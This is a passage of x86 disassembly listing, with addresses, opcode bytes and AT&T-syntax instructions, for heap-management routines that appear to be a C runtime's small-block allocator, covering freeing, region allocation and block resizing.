  41411b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41411e:	21 71 04             	and    %esi,0x4(%ecx)
  414121:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  414124:	8b 71 08             	mov    0x8(%ecx),%esi
  414127:	8b 49 04             	mov    0x4(%ecx),%ecx
  41412a:	89 4e 04             	mov    %ecx,0x4(%esi)
  41412d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  414130:	8b 71 04             	mov    0x4(%ecx),%esi
  414133:	8b 49 08             	mov    0x8(%ecx),%ecx
  414136:	89 4e 08             	mov    %ecx,0x8(%esi)
  414139:	8b 75 0c             	mov    0xc(%ebp),%esi
  41413c:	eb 03                	jmp    0x414141
  41413e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  414141:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  414145:	75 08                	jne    0x41414f
  414147:	3b da                	cmp    %edx,%ebx
  414149:	0f 84 80 00 00 00    	je     0x4141cf
  41414f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  414152:	8d 0c d1             	lea    (%ecx,%edx,8),%ecx
  414155:	8b 59 04             	mov    0x4(%ecx),%ebx
  414158:	89 4e 08             	mov    %ecx,0x8(%esi)
  41415b:	89 5e 04             	mov    %ebx,0x4(%esi)
  41415e:	89 71 04             	mov    %esi,0x4(%ecx)
  414161:	8b 4e 04             	mov    0x4(%esi),%ecx
  414164:	89 71 08             	mov    %esi,0x8(%ecx)
  414167:	8b 4e 04             	mov    0x4(%esi),%ecx
  41416a:	3b 4e 08             	cmp    0x8(%esi),%ecx
  41416d:	75 60                	jne    0x4141cf
  41416f:	8a 4c 02 04          	mov    0x4(%edx,%eax,1),%cl
  414173:	88 4d 0f             	mov    %cl,0xf(%ebp)
  414176:	fe c1                	inc    %cl
  414178:	83 fa 20             	cmp    $0x20,%edx
  41417b:	88 4c 02 04          	mov    %cl,0x4(%edx,%eax,1)
  41417f:	73 25                	jae    0x4141a6
  414181:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  414185:	75 0e                	jne    0x414195
  414187:	8b ca                	mov    %edx,%ecx
  414189:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  41418e:	d3 eb                	shr    %cl,%ebx
  414190:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414193:	09 19                	or     %ebx,(%ecx)
  414195:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  41419a:	8b ca                	mov    %edx,%ecx
  41419c:	d3 eb                	shr    %cl,%ebx
  41419e:	8d 44 b8 44          	lea    0x44(%eax,%edi,4),%eax
  4141a2:	09 18                	or     %ebx,(%eax)
  4141a4:	eb 29                	jmp    0x4141cf
  4141a6:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  4141aa:	75 10                	jne    0x4141bc
  4141ac:	8d 4a e0             	lea    -0x20(%edx),%ecx
  4141af:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4141b4:	d3 eb                	shr    %cl,%ebx
  4141b6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4141b9:	09 59 04             	or     %ebx,0x4(%ecx)
  4141bc:	8d 4a e0             	lea    -0x20(%edx),%ecx
  4141bf:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4141c4:	d3 ea                	shr    %cl,%edx
  4141c6:	8d 84 b8 c4 00 00 00 	lea    0xc4(%eax,%edi,4),%eax
  4141cd:	09 10                	or     %edx,(%eax)
  4141cf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4141d2:	89 06                	mov    %eax,(%esi)
  4141d4:	89 44 30 fc          	mov    %eax,-0x4(%eax,%esi,1)
  4141d8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4141db:	ff 08                	decl   (%eax)
  4141dd:	0f 85 f7 00 00 00    	jne    0x4142da
  4141e3:	a1 20 73 45 00       	mov    0x457320,%eax
  4141e8:	85 c0                	test   %eax,%eax
  4141ea:	0f 84 dc 00 00 00    	je     0x4142cc
  4141f0:	8b 0d 38 73 45 00    	mov    0x457338,%ecx
  4141f6:	8b 35 e4 80 41 00    	mov    0x4180e4,%esi
  4141fc:	68 00 40 00 00       	push   $0x4000
  414201:	c1 e1 0f             	shl    $0xf,%ecx
  414204:	03 48 0c             	add    0xc(%eax),%ecx
  414207:	bb 00 80 00 00       	mov    $0x8000,%ebx
  41420c:	53                   	push   %ebx
  41420d:	51                   	push   %ecx
  41420e:	ff d6                	call   *%esi
  414210:	8b 0d 38 73 45 00    	mov    0x457338,%ecx
  414216:	a1 20 73 45 00       	mov    0x457320,%eax
  41421b:	ba 00 00 00 80       	mov    $0x80000000,%edx
  414220:	d3 ea                	shr    %cl,%edx
  414222:	09 50 08             	or     %edx,0x8(%eax)
  414225:	a1 20 73 45 00       	mov    0x457320,%eax
  41422a:	8b 40 10             	mov    0x10(%eax),%eax
  41422d:	8b 0d 38 73 45 00    	mov    0x457338,%ecx
  414233:	83 a4 88 c4 00 00 00 	andl   $0x0,0xc4(%eax,%ecx,4)
  41423a:	00 
  41423b:	a1 20 73 45 00       	mov    0x457320,%eax
  414240:	8b 40 10             	mov    0x10(%eax),%eax
  414243:	fe 48 43             	decb   0x43(%eax)
  414246:	a1 20 73 45 00       	mov    0x457320,%eax
  41424b:	8b 48 10             	mov    0x10(%eax),%ecx
  41424e:	80 79 43 00          	cmpb   $0x0,0x43(%ecx)
  414252:	75 09                	jne    0x41425d
  414254:	83 60 04 fe          	andl   $0xfffffffe,0x4(%eax)
  414258:	a1 20 73 45 00       	mov    0x457320,%eax
  41425d:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
  414261:	75 69                	jne    0x4142cc
  414263:	53                   	push   %ebx
  414264:	6a 00                	push   $0x0
  414266:	ff 70 0c             	push   0xc(%eax)
  414269:	ff d6                	call   *%esi
  41426b:	a1 20 73 45 00       	mov    0x457320,%eax
  414270:	ff 70 10             	push   0x10(%eax)
  414273:	6a 00                	push   $0x0
  414275:	ff 35 3c 73 45 00    	push   0x45733c
  41427b:	ff 15 88 80 41 00    	call   *0x418088
  414281:	a1 24 73 45 00       	mov    0x457324,%eax
  414286:	8b 15 28 73 45 00    	mov    0x457328,%edx
  41428c:	8d 04 80             	lea    (%eax,%eax,4),%eax
  41428f:	c1 e0 02             	shl    $0x2,%eax
  414292:	8b c8                	mov    %eax,%ecx
  414294:	a1 20 73 45 00       	mov    0x457320,%eax
  414299:	2b c8                	sub    %eax,%ecx
  41429b:	8d 4c 11 ec          	lea    -0x14(%ecx,%edx,1),%ecx
  41429f:	51                   	push   %ecx
  4142a0:	8d 48 14             	lea    0x14(%eax),%ecx
  4142a3:	51                   	push   %ecx
  4142a4:	50                   	push   %eax
  4142a5:	e8 c6 f2 ff ff       	call   0x413570
  4142aa:	8b 45 08             	mov    0x8(%ebp),%eax
  4142ad:	83 c4 0c             	add    $0xc,%esp
  4142b0:	ff 0d 24 73 45 00    	decl   0x457324
  4142b6:	3b 05 20 73 45 00    	cmp    0x457320,%eax
  4142bc:	76 04                	jbe    0x4142c2
  4142be:	83 6d 08 14          	subl   $0x14,0x8(%ebp)
  4142c2:	a1 28 73 45 00       	mov    0x457328,%eax
  4142c7:	a3 30 73 45 00       	mov    %eax,0x457330
  4142cc:	8b 45 08             	mov    0x8(%ebp),%eax
  4142cf:	a3 20 73 45 00       	mov    %eax,0x457320
  4142d4:	89 3d 38 73 45 00    	mov    %edi,0x457338
  4142da:	5b                   	pop    %ebx
  4142db:	5f                   	pop    %edi
  4142dc:	5e                   	pop    %esi
  4142dd:	c9                   	leave
  4142de:	c3                   	ret
  4142df:	a1 24 73 45 00       	mov    0x457324,%eax
  4142e4:	8b 0d 34 73 45 00    	mov    0x457334,%ecx
  4142ea:	57                   	push   %edi
  4142eb:	33 ff                	xor    %edi,%edi
  4142ed:	3b c1                	cmp    %ecx,%eax
  4142ef:	75 34                	jne    0x414325
  4142f1:	8d 44 89 50          	lea    0x50(%ecx,%ecx,4),%eax
  4142f5:	c1 e0 02             	shl    $0x2,%eax
  4142f8:	50                   	push   %eax
  4142f9:	ff 35 28 73 45 00    	push   0x457328
  4142ff:	57                   	push   %edi
  414300:	ff 35 3c 73 45 00    	push   0x45733c
  414306:	ff 15 f0 80 41 00    	call   *0x4180f0
  41430c:	3b c7                	cmp    %edi,%eax
  41430e:	75 04                	jne    0x414314
  414310:	33 c0                	xor    %eax,%eax
  414312:	5f                   	pop    %edi
  414313:	c3                   	ret
  414314:	83 05 34 73 45 00 10 	addl   $0x10,0x457334
  41431b:	a3 28 73 45 00       	mov    %eax,0x457328
  414320:	a1 24 73 45 00       	mov    0x457324,%eax
  414325:	8b 0d 28 73 45 00    	mov    0x457328,%ecx
  41432b:	56                   	push   %esi
  41432c:	68 c4 41 00 00       	push   $0x41c4
  414331:	6a 08                	push   $0x8
  414333:	ff 35 3c 73 45 00    	push   0x45733c
  414339:	8d 04 80             	lea    (%eax,%eax,4),%eax
  41433c:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  41433f:	ff 15 8c 80 41 00    	call   *0x41808c
  414345:	3b c7                	cmp    %edi,%eax
  414347:	89 46 10             	mov    %eax,0x10(%esi)
  41434a:	75 04                	jne    0x414350
  41434c:	33 c0                	xor    %eax,%eax
  41434e:	eb 43                	jmp    0x414393
  414350:	6a 04                	push   $0x4
  414352:	68 00 20 00 00       	push   $0x2000
  414357:	68 00 00 10 00       	push   $0x100000
  41435c:	57                   	push   %edi
  41435d:	ff 15 14 80 41 00    	call   *0x418014
  414363:	3b c7                	cmp    %edi,%eax
  414365:	89 46 0c             	mov    %eax,0xc(%esi)
  414368:	75 12                	jne    0x41437c
  41436a:	ff 76 10             	push   0x10(%esi)
  41436d:	57                   	push   %edi
  41436e:	ff 35 3c 73 45 00    	push   0x45733c
  414374:	ff 15 88 80 41 00    	call   *0x418088
  41437a:	eb d0                	jmp    0x41434c
  41437c:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  414380:	89 3e                	mov    %edi,(%esi)
  414382:	89 7e 04             	mov    %edi,0x4(%esi)
  414385:	ff 05 24 73 45 00    	incl   0x457324
  41438b:	8b 46 10             	mov    0x10(%esi),%eax
  41438e:	83 08 ff             	orl    $0xffffffff,(%eax)
  414391:	8b c6                	mov    %esi,%eax
  414393:	5e                   	pop    %esi
  414394:	5f                   	pop    %edi
  414395:	c3                   	ret
  414396:	55                   	push   %ebp
  414397:	8b ec                	mov    %esp,%ebp
  414399:	51                   	push   %ecx
  41439a:	51                   	push   %ecx
  41439b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41439e:	8b 41 08             	mov    0x8(%ecx),%eax
  4143a1:	53                   	push   %ebx
  4143a2:	56                   	push   %esi
  4143a3:	8b 71 10             	mov    0x10(%ecx),%esi
  4143a6:	57                   	push   %edi
  4143a7:	33 db                	xor    %ebx,%ebx
  4143a9:	eb 03                	jmp    0x4143ae
  4143ab:	d1 e0                	shl    %eax
  4143ad:	43                   	inc    %ebx
  4143ae:	85 c0                	test   %eax,%eax
  4143b0:	7d f9                	jge    0x4143ab
  4143b2:	8b c3                	mov    %ebx,%eax
  4143b4:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  4143ba:	8d 84 30 44 01 00 00 	lea    0x144(%eax,%esi,1),%eax
  4143c1:	6a 3f                	push   $0x3f
  4143c3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4143c6:	5a                   	pop    %edx
  4143c7:	89 40 08             	mov    %eax,0x8(%eax)
  4143ca:	89 40 04             	mov    %eax,0x4(%eax)
  4143cd:	83 c0 08             	add    $0x8,%eax
  4143d0:	4a                   	dec    %edx
  4143d1:	75 f4                	jne    0x4143c7
  4143d3:	6a 04                	push   $0x4
  4143d5:	8b fb                	mov    %ebx,%edi
  4143d7:	68 00 10 00 00       	push   $0x1000
  4143dc:	c1 e7 0f             	shl    $0xf,%edi
  4143df:	03 79 0c             	add    0xc(%ecx),%edi
  4143e2:	68 00 80 00 00       	push   $0x8000
  4143e7:	57                   	push   %edi
  4143e8:	ff 15 14 80 41 00    	call   *0x418014
  4143ee:	85 c0                	test   %eax,%eax
  4143f0:	75 08                	jne    0x4143fa
  4143f2:	83 c8 ff             	or     $0xffffffff,%eax
  4143f5:	e9 9d 00 00 00       	jmp    0x414497
  4143fa:	8d 97 00 70 00 00    	lea    0x7000(%edi),%edx
  414400:	3b fa                	cmp    %edx,%edi
  414402:	89 55 fc             	mov    %edx,-0x4(%ebp)
  414405:	77 43                	ja     0x41444a
  414407:	8b ca                	mov    %edx,%ecx
  414409:	2b cf                	sub    %edi,%ecx
  41440b:	c1 e9 0c             	shr    $0xc,%ecx
  41440e:	8d 47 10             	lea    0x10(%edi),%eax
  414411:	41                   	inc    %ecx
  414412:	83 48 f8 ff          	orl    $0xffffffff,-0x8(%eax)
  414416:	83 88 ec 0f 00 00 ff 	orl    $0xffffffff,0xfec(%eax)
  41441d:	8d 90 fc 0f 00 00    	lea    0xffc(%eax),%edx
  414423:	89 10                	mov    %edx,(%eax)
  414425:	8d 90 fc ef ff ff    	lea    -0x1004(%eax),%edx
  41442b:	c7 40 fc f0 0f 00 00 	movl   $0xff0,-0x4(%eax)
  414432:	89 50 04             	mov    %edx,0x4(%eax)
  414435:	c7 80 e8 0f 00 00 f0 	movl   $0xff0,0xfe8(%eax)
  41443c:	0f 00 00 
  41443f:	05 00 10 00 00       	add    $0x1000,%eax
  414444:	49                   	dec    %ecx
  414445:	75 cb                	jne    0x414412
  414447:	8b 55 fc             	mov    -0x4(%ebp),%edx
  41444a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  41444d:	05 f8 01 00 00       	add    $0x1f8,%eax
  414452:	8d 4f 0c             	lea    0xc(%edi),%ecx
  414455:	89 48 04             	mov    %ecx,0x4(%eax)
  414458:	89 41 08             	mov    %eax,0x8(%ecx)
  41445b:	8d 4a 0c             	lea    0xc(%edx),%ecx
  41445e:	89 48 08             	mov    %ecx,0x8(%eax)
  414461:	89 41 04             	mov    %eax,0x4(%ecx)
  414464:	83 64 9e 44 00       	andl   $0x0,0x44(%esi,%ebx,4)
  414469:	33 ff                	xor    %edi,%edi
  41446b:	47                   	inc    %edi
  41446c:	89 bc 9e c4 00 00 00 	mov    %edi,0xc4(%esi,%ebx,4)
  414473:	8a 46 43             	mov    0x43(%esi),%al
  414476:	8a c8                	mov    %al,%cl
  414478:	fe c1                	inc    %cl
  41447a:	84 c0                	test   %al,%al
  41447c:	8b 45 08             	mov    0x8(%ebp),%eax
  41447f:	88 4e 43             	mov    %cl,0x43(%esi)
  414482:	75 03                	jne    0x414487
  414484:	09 78 04             	or     %edi,0x4(%eax)
  414487:	ba 00 00 00 80       	mov    $0x80000000,%edx
  41448c:	8b cb                	mov    %ebx,%ecx
  41448e:	d3 ea                	shr    %cl,%edx
  414490:	f7 d2                	not    %edx
  414492:	21 50 08             	and    %edx,0x8(%eax)
  414495:	8b c3                	mov    %ebx,%eax
  414497:	5f                   	pop    %edi
  414498:	5e                   	pop    %esi
  414499:	5b                   	pop    %ebx
  41449a:	c9                   	leave
  41449b:	c3                   	ret
  41449c:	55                   	push   %ebp
  41449d:	8b ec                	mov    %esp,%ebp
  41449f:	83 ec 0c             	sub    $0xc,%esp
  4144a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4144a5:	8b 41 10             	mov    0x10(%ecx),%eax
  4144a8:	53                   	push   %ebx
  4144a9:	56                   	push   %esi
  4144aa:	8b 75 10             	mov    0x10(%ebp),%esi
  4144ad:	57                   	push   %edi
  4144ae:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4144b1:	8b d7                	mov    %edi,%edx
  4144b3:	2b 51 0c             	sub    0xc(%ecx),%edx
  4144b6:	83 c6 17             	add    $0x17,%esi
  4144b9:	c1 ea 0f             	shr    $0xf,%edx
  4144bc:	8b ca                	mov    %edx,%ecx
  4144be:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  4144c4:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  4144cb:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4144ce:	8b 4f fc             	mov    -0x4(%edi),%ecx
  4144d1:	83 e6 f0             	and    $0xfffffff0,%esi
  4144d4:	49                   	dec    %ecx
  4144d5:	3b f1                	cmp    %ecx,%esi
  4144d7:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  4144db:	8b 1f                	mov    (%edi),%ebx
  4144dd:	89 4d 10             	mov    %ecx,0x10(%ebp)
  4144e0:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4144e3:	0f 8e 55 01 00 00    	jle    0x41463e
  4144e9:	f6 c3 01             	test   $0x1,%bl
  4144ec:	0f 85 45 01 00 00    	jne    0x414637
  4144f2:	03 d9                	add    %ecx,%ebx
  4144f4:	3b f3                	cmp    %ebx,%esi
  4144f6:	0f 8f 3b 01 00 00    	jg     0x414637
  4144fc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4144ff:	c1 f9 04             	sar    $0x4,%ecx
  414502:	49                   	dec    %ecx
  414503:	83 f9 3f             	cmp    $0x3f,%ecx
  414506:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  414509:	76 06                	jbe    0x414511
  41450b:	6a 3f                	push   $0x3f
  41450d:	59                   	pop    %ecx
  41450e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  414511:	8b 5f 04             	mov    0x4(%edi),%ebx
  414514:	3b 5f 08             	cmp    0x8(%edi),%ebx
  414517:	75 43                	jne    0x41455c
  414519:	83 f9 20             	cmp    $0x20,%ecx
  41451c:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  414521:	73 1a                	jae    0x41453d
  414523:	d3 eb                	shr    %cl,%ebx
  414525:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  414528:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  41452c:	f7 d3                	not    %ebx
  41452e:	21 5c 90 44          	and    %ebx,0x44(%eax,%edx,4)
  414532:	fe 09                	decb   (%ecx)
  414534:	75 26                	jne    0x41455c
  414536:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414539:	21 19                	and    %ebx,(%ecx)
  41453b:	eb 1f                	jmp    0x41455c
  41453d:	83 c1 e0             	add    $0xffffffe0,%ecx
  414540:	d3 eb                	shr    %cl,%ebx
  414542:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  414545:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  414549:	f7 d3                	not    %ebx
  41454b:	21 9c 90 c4 00 00 00 	and    %ebx,0xc4(%eax,%edx,4)
  414552:	fe 09                	decb   (%ecx)
  414554:	75 06                	jne    0x41455c
  414556:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414559:	21 59 04             	and    %ebx,0x4(%ecx)
  41455c:	8b 4f 08             	mov    0x8(%edi),%ecx
  41455f:	8b 5f 04             	mov    0x4(%edi),%ebx
  414562:	89 59 04             	mov    %ebx,0x4(%ecx)
  414565:	8b 4f 04             	mov    0x4(%edi),%ecx
  414568:	8b 7f 08             	mov    0x8(%edi),%edi
  41456b:	89 79 08             	mov    %edi,0x8(%ecx)
  41456e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  414571:	2b ce                	sub    %esi,%ecx
  414573:	01 4d fc             	add    %ecx,-0x4(%ebp)
  414576:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  41457a:	0f 8e a5 00 00 00    	jle    0x414625
  414580:	8b 7d fc             	mov    -0x4(%ebp),%edi
  414583:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  414586:	c1 ff 04             	sar    $0x4,%edi
  414589:	4f                   	dec    %edi
  41458a:	83 ff 3f             	cmp    $0x3f,%edi
  41458d:	8d 4c 31 fc          	lea    -0x4(%ecx,%esi,1),%ecx
  414591:	76 03                	jbe    0x414596
  414593:	6a 3f                	push   $0x3f
  414595:	5f                   	pop    %edi
  414596:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  414599:	8d 1c fb             	lea    (%ebx,%edi,8),%ebx
  41459c:	89 5d 10             	mov    %ebx,0x10(%ebp)
  41459f:	8b 5b 04             	mov    0x4(%ebx),%ebx
  4145a2:	89 59 04             	mov    %ebx,0x4(%ecx)
  4145a5:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4145a8:	89 59 08             	mov    %ebx,0x8(%ecx)
  4145ab:	89 4b 04             	mov    %ecx,0x4(%ebx)
  4145ae:	8b 59 04             	mov    0x4(%ecx),%ebx
  4145b1:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4145b4:	8b 59 04             	mov    0x4(%ecx),%ebx
  4145b7:	3b 59 08             	cmp    0x8(%ecx),%ebx
  4145ba:	75 57                	jne    0x414613
  4145bc:	8a 4c 07 04          	mov    0x4(%edi,%eax,1),%cl
  4145c0:	88 4d 13             	mov    %cl,0x13(%ebp)
  4145c3:	fe c1                	inc    %cl
  4145c5:	83 ff 20             	cmp    $0x20,%edi
  4145c8:	88 4c 07 04          	mov    %cl,0x4(%edi,%eax,1)
  4145cc:	73 1c                	jae    0x4145ea
  4145ce:	80 7d 13 00          	cmpb   $0x0,0x13(%ebp)
  4145d2:	75 0e                	jne    0x4145e2
  4145d4:	8b cf                	mov    %edi,%ecx
  4145d6:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4145db:	d3 eb                	shr    %cl,%ebx
  4145dd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4145e0:	09 19                	or     %ebx,(%ecx)
  4145e2:	8d 44 90 44          	lea    0x44(%eax,%edx,4),%eax
  4145e6:	8b cf                	mov    %edi,%ecx
  4145e8:	eb 20                	jmp    0x41460a
  4145ea:	80 7d 13 00          	cmpb   $0x0,0x13(%ebp)
  4145ee:	75 10                	jne    0x414600
  4145f0:	8d 4f e0             	lea    -0x20(%edi),%ecx
  4145f3:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4145f8:	d3 eb                	shr    %cl,%ebx
  4145fa:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4145fd:	09 59 04             	or     %ebx,0x4(%ecx)
  414600:	8d 84 90 c4 00 00 00 	lea    0xc4(%eax,%edx,4),%eax
  414607:	8d 4f e0             	lea    -0x20(%edi),%ecx
  41460a:	ba 00 00 00 80       	mov    $0x80000000,%edx
  41460f:	d3 ea                	shr    %cl,%edx
  414611:	09 10                	or     %edx,(%eax)
  414613:	8b 55 0c             	mov    0xc(%ebp),%edx
  414616:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  414619:	8d 44 32 fc          	lea    -0x4(%edx,%esi,1),%eax
  41461d:	89 08                	mov    %ecx,(%eax)
  41461f:	89 4c 01 fc          	mov    %ecx,-0x4(%ecx,%eax,1)
  414623:	eb 03                	jmp    0x414628
  414625:	8b 55 0c             	mov    0xc(%ebp),%edx
  414628:	8d 46 01             	lea    0x1(%esi),%eax
  41462b:	89 42 fc             	mov    %eax,-0x4(%edx)
  41462e:	89 44 32 f8          	mov    %eax,-0x8(%edx,%esi,1)
  414632:	e9 3c 01 00 00       	jmp    0x414773
  414637:	33 c0                	xor    %eax,%eax
  414639:	e9 38 01 00 00       	jmp    0x414776
  41463e:	0f 8d 2f 01 00 00    	jge    0x414773
  414644:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  414647:	29 75 10             	sub    %esi,0x10(%ebp)
  41464a:	8d 4e 01             	lea    0x1(%esi),%ecx
  41464d:	89 4b fc             	mov    %ecx,-0x4(%ebx)
  414650:	8d 5c 33 fc          	lea    -0x4(%ebx,%esi,1),%ebx
  414654:	8b 75 10             	mov    0x10(%ebp),%esi
  414657:	c1 fe 04             	sar    $0x4,%esi
  41465a:	4e                   	dec    %esi
  41465b:	83 fe 3f             	cmp    $0x3f,%esi
  41465e:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  414661:	89 4b fc             	mov    %ecx,-0x4(%ebx)
  414664:	76 03                	jbe    0x414669
  414666:	6a 3f                	push   $0x3f
  414668:	5e                   	pop    %esi
  414669:	f6 45 fc 01          	testb  $0x1,-0x4(%ebp)
  41466d:	0f 85 80 00 00 00    	jne    0x4146f3
  414673:	8b 75 fc             	mov    -0x4(%ebp),%esi
  414676:	c1 fe 04             	sar    $0x4,%esi
  414679:	4e                   	dec    %esi
  41467a:	83 fe 3f             	cmp    $0x3f,%esi
  41467d:	76 03                	jbe    0x414682
  41467f:	6a 3f                	push   $0x3f
  414681:	5e                   	pop    %esi
  414682:	8b 4f 04             	mov    0x4(%edi),%ecx
  414685:	3b 4f 08             	cmp    0x8(%edi),%ecx
  414688:	75 42                	jne    0x4146cc
  41468a:	83 fe 20             	cmp    $0x20,%esi
  41468d:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  414692:	73 19                	jae    0x4146ad
  414694:	8b ce                	mov    %esi,%ecx
  414696:	d3 eb                	shr    %cl,%ebx
  414698:	8d 74 06 04          	lea    0x4(%esi,%eax,1),%esi
  41469c:	f7 d3                	not    %ebx
  41469e:	21 5c 90 44          	and    %ebx,0x44(%eax,%edx,4)
  4146a2:	fe 0e                	decb   (%esi)
  4146a4:	75 23                	jne    0x4146c9
  4146a6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4146a9:	21 19                	and    %ebx,(%ecx)
  4146ab:	eb 1c                	jmp    0x4146c9
  4146ad:	8d 4e e0             	lea    -0x20(%esi),%ecx
  4146b0:	d3 eb                	shr    %cl,%ebx
  4146b2:	8d 4c 06 04          	lea    0x4(%esi,%eax,1),%ecx
  4146b6:	f7 d3                	not    %ebx
  4146b8:	21 9c 90 c4 00 00 00 	and    %ebx,0xc4(%eax,%edx,4)
  4146bf:	fe 09                	decb   (%ecx)
  4146c1:	75 06                	jne    0x4146c9
  4146c3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4146c6:	21 59 04             	and    %ebx,0x4(%ecx)
  4146c9:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4146cc:	8b 4f 08             	mov    0x8(%edi),%ecx
  4146cf:	8b 77 04             	mov    0x4(%edi),%esi
  4146d2:	89 71 04             	mov    %esi,0x4(%ecx)
  4146d5:	8b 77 08             	mov    0x8(%edi),%esi
  4146d8:	8b 4f 04             	mov    0x4(%edi),%ecx
  4146db:	89 71 08             	mov    %esi,0x8(%ecx)
  4146de:	8b 75 10             	mov    0x10(%ebp),%esi
  4146e1:	03 75 fc             	add    -0x4(%ebp),%esi
  4146e4:	89 75 10             	mov    %esi,0x10(%ebp)
  4146e7:	c1 fe 04             	sar    $0x4,%esi
  4146ea:	4e                   	dec    %esi
  4146eb:	83 fe 3f             	cmp    $0x3f,%esi
  4146ee:	76 03                	jbe    0x4146f3
  4146f0:	6a 3f                	push   $0x3f
  4146f2:	5e                   	pop    %esi
  4146f3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4146f6:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  4146f9:	8b 79 04             	mov    0x4(%ecx),%edi
  4146fc:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4146ff:	89 7b 04             	mov    %edi,0x4(%ebx)
  414702:	89 59 04             	mov    %ebx,0x4(%ecx)
  414705:	8b 4b 04             	mov    0x4(%ebx),%ecx
  414708:	89 59 08             	mov    %ebx,0x8(%ecx)
  41470b:	8b 4b 04             	mov    0x4(%ebx),%ecx
  41470e:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  414711:	75 57                	jne    0x41476a
  414713:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  414717:	88 4d 0f             	mov    %cl,0xf(%ebp)
  41471a:	fe c1                	inc    %cl
  41471c:	83 fe 20             	cmp    $0x20,%esi
  41471f:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  414723:	73 1c                	jae    0x414741
  414725:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  414729:	75 0e                	jne    0x414739
  41472b:	8b ce                	mov    %esi,%ecx
  41472d:	bf 00 00 00 80       	mov    $0x80000000,%edi
  414732:	d3 ef                	shr    %cl,%edi
  414734:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414737:	09 39                	or     %edi,(%ecx)
  414739:	8d 44 90 44          	lea    0x44(%eax,%edx,4),%eax
  41473d:	8b ce                	mov    %esi,%ecx
  41473f:	eb 20                	jmp    0x414761
  414741:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  414745:	75 10                	jne    0x414757
  414747:	8d 4e e0             	lea    -0x20(%esi),%ecx
  41474a:	bf 00 00 00 80       	mov    $0x80000000,%edi
  41474f:	d3 ef                	shr    %cl,%edi
  414751:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414754:	09 79 04             	or     %edi,0x4(%ecx)
  414757:	8d 84 90 c4 00 00 00 	lea    0xc4(%eax,%edx,4),%eax
  41475e:	8d 4e e0             	lea    -0x20(%esi),%ecx
  414761:	ba 00 00 00 80       	mov    $0x80000000,%edx
  414766:	d3 ea                	shr    %cl,%edx
  414768:	09 10                	or     %edx,(%eax)
  41476a:	8b 45 10             	mov    0x10(%ebp),%eax
  41476d:	89 03                	mov    %eax,(%ebx)
  41476f:	89 44 18 fc          	mov    %eax,-0x4(%eax,%ebx,1)
  414773:	33 c0                	xor    %eax,%eax
  414775:	40                   	inc    %eax
  414776:	5f                   	pop    %edi
  414777:	5e                   	pop    %esi
  414778:	5b                   	pop    %ebx
  414779:	c9                   	leave
  41477a:	c3                   	ret
  41477b:	55                   	push   %ebp
  41477c:	8b ec                	mov    %esp,%ebp
  41477e:	83 ec 14             	sub    $0x14,%esp
  414781:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414784:	a1 24 73 45 00       	mov    0x457324,%eax
  414789:	8b 15 28 73 45 00    	mov    0x457328,%edx
